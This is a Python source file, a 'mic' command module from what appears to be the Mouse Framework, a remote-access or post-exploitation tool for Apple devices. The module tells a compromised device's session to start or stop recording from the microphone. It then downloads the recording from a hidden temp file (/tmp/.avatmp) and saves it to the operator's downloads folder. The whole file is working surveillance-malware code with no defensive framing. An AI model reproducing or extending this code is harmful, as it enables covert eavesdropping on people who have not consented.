#!/usr/bin/env python

#            ---------------------------------------------------
#                              Mouse Framework                                 
#            ---------------------------------------------------
#                Copyright (C) <2019-2020>  <Entynetproject>
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

import core.helper as h
import json
import time
import os

class command:
    def __init__(self):
        self.name = "mic"
        self.description = "Record mic sound."
        
    def run(self,session,cmd_data):
        # #print output        
        if cmd_data["args"] == "stop":
            # expect json
            result = json.loads(session.send_command(cmd_data))
            if 'error' in result:
                h.info_error("Error: " + result['error'])
            elif 'status' in result and result['status'] == 1:
                # download file
                data = session.download_file("/tmp/.avatmp")
                # save to file
                file_name = "mic{0}.caf".format(str(int(time.time())))
                h.info_general("Saving {0}".format(file_name))
                f = open(os.path.join('downloads',file_name),'w')
                f.write(data)
                f.close()
                h.info_success("Saved to downloads/{0}!".format(file_name))
            
        elif cmd_data["args"] == "start":
            h.info_general(session.send_command(cmd_data))
        else:
            print "Usage: mic [start|stop]"
